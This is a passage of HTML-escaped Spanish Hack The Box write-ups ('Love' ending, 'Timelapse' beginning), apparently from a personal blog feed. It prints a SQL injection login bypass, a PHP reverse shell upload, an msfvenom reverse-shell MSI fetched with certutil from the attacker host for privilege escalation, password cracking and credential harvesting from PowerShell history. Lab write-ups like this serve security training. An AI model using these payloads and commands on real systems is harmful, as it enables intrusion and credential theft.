&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;yea&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&amp;amp;username&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dsfgdf&lt;span class=&quot;s1&quot;&gt;&apos; UNION SELECT 1,2,&quot;$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K&quot;,4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Asi que ahora solo queda interceptar la peticion nuevamente e inyectar el payload.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/SJVMNJz.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De ahi en más, solamente aprete &lt;strong&gt;Forward&lt;/strong&gt; unas 3 veces para lograr ingresar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/wNaZ41k.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora me quedaba encontrar algun fallo en el sistema para ver si podia lograr algo desde el panel.&lt;/p&gt;

&lt;p&gt;Cuando me puse a buscar en Google vulnerabilidades, me di cuenta de que estaba &lt;a href=&quot;https://www.exploit-db.com/exploits/49846&quot;&gt;este RCE&lt;/a&gt; que pedia autenticación, asi que fui a revisarlo.&lt;/p&gt;

&lt;p&gt;El script pedia los datos del usuario administrador para ejecutar codigo.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;De aqui en adelante he visto que otros usuarios de HTB toman otra via para encontrar las credenciales de Admin y ejecutar la vulnerabilidad, viendo el puerto 5000 a tres de otra pagina con subdomino. Esto no lo hice, ya que no me percate de que podia existir un subdominio en este momento. Entiendo que esta vulnerabilidad estaba prevista para ejecutarse con este payload, pero quizá no de la manera que yo lo hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Pero leyendo el codigo me di cuenta de que simplemente se podia hacer estando logeado desde la misma interfaz.&lt;/p&gt;

&lt;p&gt;Fui al apartado de &lt;strong&gt;Voters&lt;/strong&gt; y agregue uno nuevo. Rellene los datos y en el apartado de &lt;strong&gt;Photo&lt;/strong&gt; cargue un script &lt;strong&gt;PHP&lt;/strong&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;FAIL: Acá igual me lleve un rato probando scripts, ya que el que estaba documentado en exploit-db no funciono, y tambien estuve probando otros (como se ve en la imagen).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/pBjnYW7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El exploit que use es el de Ivan Sincek, puedes &lt;a href=&quot;https://github.com/ivan-sincek/php-reverse-shell&quot;&gt;verlo acá&lt;/a&gt;, o puedes hacerlo como yo que simplemente lo saque &lt;a href=&quot;https://www.revshells.com/&quot;&gt;revshells.com&lt;/a&gt;, en el apartado de Windows.&lt;/p&gt;

&lt;p&gt;Luego lo que quedaba era ejecutar el script PHP, en el codigo se puede ver que lo carga desde el directorio &lt;strong&gt;images&lt;/strong&gt; simplemente abriendolo desde la URL.&lt;/p&gt;

&lt;p&gt;Asi que pongo en escucha el netcat e ingreso a la URL:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/syIWCX3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;SHELL OBTENIDA.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ahora busco la User Flag y continuo con la escala de privilegio.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 4545
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4545 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.7] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.239] 63812
SOCKET: Shell has connected! PID: 2448
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.19042.867]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;mrs&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;mages&amp;gt;whoami
love&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;hoebe

C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;mrs&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;mages&amp;gt;cd C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;hoebe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop

C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;hoebe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;dir
 Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;hoebe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop

04/13/2021  03:20 AM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
04/13/2021  03:20 AM    &amp;lt;DIR&amp;gt;          ..
10/25/2023  05:33 PM                34 user.txt
               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             34 bytes
               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   3,856,453,632 bytes free

C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;hoebe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;type usr.txt
The system cannot find the file specified.

C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;hoebe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;type user.txt
c7b85e76&lt;span class=&quot;k&quot;&gt;**************************&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/h1&gt;

&lt;p&gt;Lo primero que hago es hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami /priv&lt;/code&gt; pero no veo nada interesante.
Asi que descargo winPEAS y lo transfiero a la maquina Windows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/91ZVNRy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;FAIL: En este punto no sabia que podia hacer, por mi desconocimiento hackeando Windows, asi que me pongo a probar diferentes cosas como JuicyPotato para escalar privilegios, pero no logro dar con nada.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Buscando alguna ayuda me informo de que &lt;strong&gt;AlwaysInstallElevated&lt;/strong&gt; al estar seteado en 1 tanto en &lt;strong&gt;HKLM&lt;/strong&gt; como en &lt;strong&gt;HMCU&lt;/strong&gt; podemos sacar provecho para escalar privilegio.
(Esto se puede ver utilizando winPEAS.)&lt;/p&gt;

&lt;p&gt;Al parecer se puede crear un .MSI con Msfvenom para escalar privilegios.&lt;/p&gt;

&lt;p&gt;Entonces hago un exploit Reverse Shell con un archivo .msi&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.29 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4321 &lt;span class=&quot;nt&quot;&gt;--platform&lt;/span&gt; windows &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x64 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; msi &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; reverse2.msi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora debo subirlo a Windows abriendo un servidor Python:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y descargandolo desde Windows:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.7/reverse2.msi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora me pongo en escucha por el puerto 4321 con NetCat:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 4321
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;y ejecuto el .MSI con:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msiexec /quiet /qn /i reverse2.msi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ntu3hWv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ROOT SHELL OBTENIDA.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ahora solo me queda ir por la Root Flag:&lt;/p&gt;

&lt;p&gt;```bash
C:\WINDOWS\system32&amp;gt;whoami
whoami
nt authority\system&lt;/p&gt;

&lt;p&gt;C:\WINDOWS\system32&amp;gt;cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop&lt;/p&gt;

&lt;p&gt;C:\Users\Administrator\Desktop&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30&lt;/p&gt;

&lt;p&gt;Directory of C:\Users\Administrator\Desktop&lt;/p&gt;

&lt;p&gt;04/13/2021  03:20 AM    &lt;DIR&gt;          .
04/13/2021  03:20 AM    &lt;DIR&gt;          ..
10/25/2023  05:33 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,850,883,072 bytes free&lt;/DIR&gt;&lt;/DIR&gt;&lt;/p&gt;

&lt;p&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt  &lt;br /&gt;
type root.txt
1bd72aa6&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;*```&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="Facil," /><category term="Windows" /><summary type="html">BUFF ~ Hack The Box</summary></entry><entry><title type="html">Maquina Timelapse | HTB Write-Up</title><link href="http://localhost:4000/2023/09/29/Timelapse.html" rel="alternate" type="text/html" title="Maquina Timelapse | HTB Write-Up" /><published>2023-09-29T00:00:00-03:00</published><updated>2023-09-29T00:00:00-03:00</updated><id>http://localhost:4000/2023/09/29/Timelapse</id><content type="html" xml:base="http://localhost:4000/2023/09/29/Timelapse.html">&lt;h1 id=&quot;timelapse--hack-the-box&quot;&gt;Timelapse ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Machine IP: 10.10.11.152&lt;/p&gt;

&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;

&lt;p&gt;Comienzo el reconocimiento de puertos y versiones:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2023-10-27 00:33:41Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: timelapse.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: timelapse.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssl-date: 2023-10-27T00:35:13+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +7h59m59s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enseguida realizo un reconocimiento al servicio SMB utilizando SMBMAP:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.11.152 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;null&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.152:445	Name: timelapse.htb       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                  	&lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;	&lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
	ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                           	NO ACCESS	Remote Admin
	C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                               	NO ACCESS	Default share
	IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Shares                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Me conecto al directorio &lt;strong&gt;Shares&lt;/strong&gt; con &lt;strong&gt;smbclient&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient //10.10.11.152/Shares &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encuentro dos directorios:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Dev                                 D        0  Mon Oct 25 16:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 12:48:42 2021
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;explotación-de-vulnerabilidades&quot;&gt;Explotación de vulnerabilidades&lt;/h2&gt;

&lt;p&gt;Dentro del directorio &lt;strong&gt;Dev&lt;/strong&gt; se encuentra un Zip que descargo en mi maquina local, el Zip requiere una password para ser extraido. Asi que con &lt;strong&gt;fcrackzip&lt;/strong&gt; le realizo un ataque de fuerza bruta para intentar descifrar la password:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ fcrackzip &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; /usr/share/wordlists/rockyou.txt winrm_backup.zip
found file &lt;span class=&quot;s1&quot;&gt;&apos;legacyy_dev_auth.pfx&apos;&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;size &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt;/uc   2405/  2555, flags 9, chk 72aa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
checking pw udehss                                  

PASSWORD FOUND!!!!: pw &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; supremelegacy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Al extraer el Zip se encuentra un archivo &lt;strong&gt;.pfx&lt;/strong&gt; el cual tambien requiere una password para ser utilizado.&lt;/p&gt;

&lt;p&gt;Para descifrar la password tambien utilizare un ataque por fuerza bruta, en este caso utilizando &lt;a href=&quot;https://github.com/crackpkcs12/crackpkcs12&quot;&gt;crackpkcs12&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackpkcs12 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx

Dictionary attack - Starting 12 threads

&lt;span class=&quot;k&quot;&gt;*********************************************************&lt;/span&gt;
Dictionary attack - Thread 10 - Password found: thuglegacy
&lt;span class=&quot;k&quot;&gt;*********************************************************&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora procedo a generar una clave privada (.pem) con el .PFX:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; legacyy_dev_auth.pfx &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; priv-key.pem &lt;span class=&quot;nt&quot;&gt;-nodes&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y tambien un certificado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; legacyy_dev_auth.pfx &lt;span class=&quot;nt&quot;&gt;-nokeys&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; certificate.pem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora utilizando Evil-WinRM nos conectamos utilizando los .pem:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.11.152 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; certificate.pem &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; priv-key.pem &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt;
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;egacyy&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;timelapse&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;egacyy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Importante destacar que en el comando de Evil-WinRM se utiliza la flag &lt;strong&gt;-S&lt;/strong&gt; indicado que es SSL, ya que nos estamos conectando al puerto 5986 que es el que requiere SSL, si no ponemos esta flag, nos concetara al 5985 que es sin SSL. Y en este caso no funcionaria.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Y solo queda buscar la User-Flag antes de escalar privilegios:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;egacyy&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;egacyy&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;       10/26/2023   5:32 PM             34 user.txt


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;egacyy&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;user.txt
6f72b366&lt;span class=&quot;k&quot;&gt;************************&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/h2&gt;

&lt;p&gt;Para la escalada de privilegios lo primero que hice fue revisar el historial de la PowerShell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$env&lt;/span&gt;:APPDATA&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;owerShell&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;SReadLine&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;o
nsoleHost_history.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y enseguida encontre lo que parecen ser credenciales para &lt;strong&gt;svc_deploy&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;ipconfig /all
netstat &lt;span class=&quot;nt&quot;&gt;-ano&lt;/span&gt; |select-string LIST
&lt;span class=&quot;nv&quot;&gt;$so&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-PSSessionOption &lt;span class=&quot;nt&quot;&gt;-SkipCACheck&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-SkipCNCheck&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-SkipRevocationCheck&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&quot;s1&quot;&gt;&apos;E3R$Q62^12p7PLlC%KWaxuaV&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;svc_deploy&apos;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
invoke-command &lt;span class=&quot;nt&quot;&gt;-computername&lt;/span&gt; localhost &lt;span class=&quot;nt&quot;&gt;-credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-port&lt;/span&gt; 5986 &lt;span class=&quot;nt&quot;&gt;-usessl&lt;/span&gt; -
